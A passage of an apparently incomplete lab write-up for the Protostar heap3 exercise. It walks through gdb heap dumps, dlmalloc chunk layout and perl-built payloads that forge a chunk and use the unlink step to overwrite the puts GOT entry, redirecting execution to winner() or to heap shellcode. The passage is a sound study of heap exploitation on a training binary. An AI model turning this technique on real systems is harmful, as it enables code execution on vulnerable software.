<span class="mh">0x080488fe</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="n">C</span>
<span class="mh">0x08048902</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">121</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048905</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048750</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804890a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">129</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
</code></pre></div>


<p>Then the arguments are copied to the allocated memory locations.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="mh">0x0804890a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">129</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="n">C</span>
<span class="mh">0x0804890e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">133</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048911</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
<span class="mh">0x08048916</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">141</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="n">B</span>
<span class="mh">0x0804891a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">145</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804891d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
<span class="mh">0x08048922</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">153</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x14</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="n">A</span>
<span class="mh">0x08048926</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">157</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048929</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">160</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8049824</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">&gt;</span>
<span class="mh">0x0804892e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">165</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x804ac27</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048935</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">172</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048790</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div>


<p>Then, the three variables are free()d.
And let&rsquo;s take a look at the heap right after the mallocs.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x14</span>
<span class="mh">0xbffff654</span><span class="o">:</span>     <span class="mh">0x0804c008</span>      <span class="mh">0x0804c030</span>      <span class="mh">0x0804c058</span>      <span class="mh">0x0804ab50</span>
<span class="mh">0xbffff664</span><span class="o">:</span>     <span class="mh">0x00000000</span>      <span class="mh">0xbffff6e8</span>      <span class="mh">0xb7eadc76</span>      <span class="mh">0x00000004</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c008</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c000</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c010</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c020</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c030</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c028</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c038</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c048</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c058</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c050</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c060</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c070</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000f89</span>
</code></pre></div>


<h2 id="malloc-free">Malloc &amp; free</h2>

<p>A good explanation of heap memory management is available in phrack 57 - Once upon a free().
Let&rsquo;s just sum up the essential parts.</p>

<p>Malloc allocates the number of requested bytes + 8.
The layout on the heap of a single chunk looks as follows:</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">;</span>            <span class="o">+----------------------------------+</span>
    <span class="n">chunk</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="n">prev_size</span>                        <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
             <span class="o">|</span> <span class="n">size</span>                         <span class="o">|</span><span class="n">M</span><span class="o">|</span><span class="n">P</span><span class="o">|</span>
             <span class="o">+----------------------------------+</span>
      <span class="n">mem</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="n">data</span>                             <span class="o">|</span>
             <span class="o">:</span> <span class="p">...</span>                              <span class="o">:</span>
             <span class="o">+----------------------------------+</span>
<span class="n">nextchunk</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="n">prev_size</span> <span class="p">...</span>                    <span class="o">|</span>
             <span class="o">:</span>                                  <span class="o">:</span>
</code></pre></div>


<p>In the above listing M corresponds to the IS_MMAPPED flag.
P on the other hand, corresponds to the PREV_INUSE flag.</p>

<p>After free()ing the memory, the unallocated chunks are kept in an double-linked list.
The chunk usually includes size and prev_size as well as a pointer forward and backwards.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">;</span>            <span class="o">+----------------------------------+</span>
    <span class="n">chunk</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="n">prev_size</span>                        <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
             <span class="o">|</span> <span class="n">size</span>                             <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
      <span class="n">mem</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="n">fd</span>                               <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
             <span class="o">|</span> <span class="n">bk</span>                               <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
             <span class="o">|</span> <span class="p">(</span><span class="n">old</span> <span class="n">memory</span><span class="p">,</span> <span class="n">can</span> <span class="n">be</span> <span class="n">zero</span> <span class="n">bytes</span><span class="p">)</span>  <span class="o">|</span>
             <span class="o">:</span>                                  <span class="o">:</span>
<span class="n">nextchunk</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="n">prev_size</span> <span class="p">...</span>                    <span class="o">|</span>
             <span class="o">:</span>                                  <span class="o">:</span>
</code></pre></div>


<p>With malloc based buffer overflow we can manipulate the heap structure.
Subsequently, free()ing utilizes <em>fd</em> an <em>bk</em> pointers to adjust the list.
This write allows use to e.g. manipulate the Global Offset Table.</p>

<p>A few aspects have to be taken into consideration:</p>

<ul>
<li>the least significant bit of &lsquo;size&rsquo; has to be zero (PREV_INUSE).</li>
<li>&lsquo;prev_size&rsquo; and &lsquo;size&rsquo; should be add-safe to a pointer that is read from. So either use very small values up to a few thousand, or use big values such as 0xfffffffc.</li>
<li>(chunk_boundary + size + 4) the lowest bit is zeroed out (0xfffffffc will work just fine)</li>
<li>(bk + 8) will be overwritten. A short jump can help thwart that problem.</li>
</ul>

<p>An generic way to exploit this vulnerability looks as follows:</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">;</span>            <span class="o">+----------------------------------+</span>
   <span class="n">retloc</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="err">\</span><span class="n">xeb</span><span class="err">\</span><span class="n">x0c</span> <span class="err">\</span><span class="n">x90</span><span class="err">\</span><span class="n">x90</span>                <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
             <span class="o">|</span> <span class="err">\</span><span class="n">x90</span><span class="err">\</span><span class="n">x90</span><span class="err">\</span><span class="n">x90</span><span class="err">\</span><span class="n">x90</span>                 <span class="o">|</span>
             <span class="o">:</span>  <span class="nl">shellcode</span>                       <span class="p">:</span>
             <span class="o">+----------------------------------+</span>
    <span class="n">chunk</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xfc</span>                 <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
             <span class="o">|</span> <span class="err">\</span><span class="n">xf0</span>                             <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
      <span class="n">mem</span> <span class="o">-&gt;</span> <span class="o">|</span> <span class="n">retloc</span> <span class="o">-</span> <span class="mh">0xc</span>                     <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
             <span class="o">|</span> <span class="n">retaddr</span>                          <span class="o">|</span>
             <span class="o">+----------------------------------+</span>
             <span class="o">:</span>                                  <span class="o">:</span>
</code></pre></div>


<p>Let&rsquo;s try this approach.</p>

<h2 id="bending-the-heap">Bending the Heap</h2>

<p>The trick here is to use a negative value for the previous chunk size.
This forces the previous chunk to be calculated after the current chunk while avoiding null bytes.
Doing this, basically allows us to introduce a virtual chunk.</p>

<p>To be more precise, we can write 32 bytes to fill up one chunk.
Then, we need to append size of previous chunk: <em>0xfffffffc</em> = <em>-4</em>.
Next comes the size of our virtual chunk: <em>0xf0</em> = <em>240</em>.
Any size above 64 bytes with the two LSB set to 8 does the trick.</p>

<!-- TODO: Nice graph //-->

<!-- TODO: with new gdbinit //-->

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="n">AAAA</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;B&quot;</span><span class="n">x32</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xfc\xff\xff\xff</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xf0</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="n">CCCCDDDDEEEE</span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="mh">0x080498fd</span> <span class="n">in</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c058</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3638</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c008</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c000</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>      <span class="mh">0x41414141</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c010</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c020</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c030</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c028</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804c038</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804c048</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0xfffffffc</span>      <span class="mh">0x000000f0</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c058</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c050</span><span class="o">:</span>      <span class="mh">0xfffffffc</span>      <span class="mh">0x000000f0</span>      <span class="mh">0x43434343</span>      <span class="mh">0x44444444</span>
<span class="mh">0x804c060</span><span class="o">:</span>      <span class="mh">0x45454545</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c070</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000f89</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
<span class="mh">0x80498fd</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">217</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">)</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span> <span class="err">$</span><span class="n">eax</span> <span class="err">$</span><span class="n">edx</span>
<span class="n">eax</span>            <span class="mh">0x44444444</span>       <span class="mi">1145324612</span>
<span class="n">edx</span>            <span class="mh">0x45454545</span>       <span class="mi">1162167621</span>
</code></pre></div>


<p>Once the free() gets executed it segfaults trying to write to 0x44444444 + 0xc with the value 0x45454545.
This was an expected behavior when trying to unlink the third chunk.</p>

<p>The next step is to set the FD and BK pointers correctly.
For this exercise, we have to execute the winner() function.
To achieve our goal, we can patch the GOT for the puts() call.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="gp">user@protostar:/$</span> objdump -R /opt/protostar/binheap3 <span class="p">|</span> grep puts
<span class="go">0804b128 R_386_JUMP_SLOT   puts</span>
<span class="gp">user@protostar:/$</span> objdump -R /opt/protostar/binheap3 <span class="p">|</span> grep -i winner
<span class="go">08048864 g     F .text  00000025              winner</span>
</code></pre></div>


<p>So we need to overwrite 0x0804b128 with 0x08048864.
The destination address should be adjusted by - 0xc = 0x0804b11c.
Let&rsquo;s see how this works.</p>

<!-- FIXME: Verify the command, seems odd //-->

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="n">AAAA</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;B&quot;</span><span class="n">x32</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xfc\xff\xff\xff</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xf0</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;CCCC&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x1c\xb1\x04\x08</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x64\x88\x04\x08</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="mh">0x08049906</span> <span class="n">in</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c058</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3638</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x0804b128</span>
<span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x08048864</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
<span class="mh">0x8049906</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">226</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">eax</span><span class="p">)</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span> <span class="err">$</span><span class="n">eax</span> <span class="err">$</span><span class="n">edx</span>
<span class="n">eax</span>            <span class="mh">0x8048864</span>        <span class="mi">134514788</span>
<span class="n">edx</span>            <span class="mh">0x804b11c</span>        <span class="mi">134525212</span>
</code></pre></div>


<p>So there&rsquo;s still a problem.
During unlinking, also the location of bk+8 is written.
This winner function is located in the .text section of the binary and is not writeable.
We can try to jump into the first heap chunk and
Let&rsquo;s take a look.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;</span><span class="se">\xCC</span><span class="s">&quot;</span><span class="n">x32</span><span class="err">&#39;</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;B&quot;</span><span class="n">x32</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xfc\xff\xff\xff</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xf0</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;CCCC&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x1c\xb1\x04\x08</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x08\xc0\x04\x08</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">regs</span><span class="p">]</span>
  <span class="nl">EAX</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EBX</span><span class="p">:</span> <span class="mh">0xB7FD7FF4</span>  <span class="nl">ECX</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EDX</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="n">o</span> <span class="n">d</span> <span class="n">I</span> <span class="n">t</span> <span class="n">s</span> <span class="n">Z</span> <span class="n">a</span> <span class="n">P</span> <span class="n">c</span>
  <span class="nl">ESI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EDI</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="nl">EBP</span><span class="p">:</span> <span class="mh">0xBFFFF5F8</span>  <span class="nl">ESP</span><span class="p">:</span> <span class="mh">0xBFFFF5B0</span>  <span class="nl">EIP</span><span class="p">:</span> <span class="mh">0x08049951</span>
  <span class="nl">CS</span><span class="p">:</span> <span class="mo">0073</span>  <span class="nl">DS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">ES</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>  <span class="nl">FS</span><span class="p">:</span> <span class="mo">0000</span>  <span class="nl">GS</span><span class="p">:</span> <span class="mo">0033</span>  <span class="nl">SS</span><span class="p">:</span> <span class="mo">007</span><span class="n">B</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">code</span><span class="p">]</span>
<span class="mh">0x8049951</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">301</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="n">edx</span>
<span class="mh">0x8049954</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">304</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x18</span><span class="p">]</span>
<span class="mh">0x8049957</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">307</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x14</span><span class="p">]</span>
<span class="mh">0x804995a</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">310</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">edx</span>
<span class="mh">0x804995d</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">313</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x24</span><span class="p">]</span>
<span class="mh">0x8049960</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">316</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x30</span><span class="p">],</span><span class="n">eax</span>
<span class="mh">0x8049963</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">319</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x38</span><span class="p">]</span>
<span class="mh">0x8049966</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">322</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x34</span>
<span class="o">--------------------------------------------------------------------------------</span>
<span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x0804b128</span>
<span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>	<span class="mh">0x0804c008</span>
<span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c008</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c000</span><span class="o">:</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000029</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804c010</span><span class="o">:</span>	<span class="mh">0x0804b11c</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>
<span class="mh">0x804c020</span><span class="o">:</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0xcccccccc</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000029</span>
</code></pre></div>


<p>So, the fd-pointer is written.
We run into a problem when the third chunk is free()d.</p>

<p>The code branch of free+301 is responsible to keep the pointers in place.
In particular, the pointers of next_next chunk are checked</p>

<p>Now we need to fix fd, the pointer to the next chunk.</p>

<!-- FIXME: How do we solve this. next chunk, nextnext chunk //-->

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;</span><span class="se">\xCC</span><span class="s">&quot;</span><span class="n">x32</span><span class="err">&#39;</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;B&quot;</span><span class="n">x16</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="n">x4</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xff</span><span class="s">&quot;</span><span class="n">x4</span> <span class="p">.</span><span class="s">&quot;B&quot;</span><span class="n">x8</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xfc\xff\xff\xff</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xf0\xff\xff\xff</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span 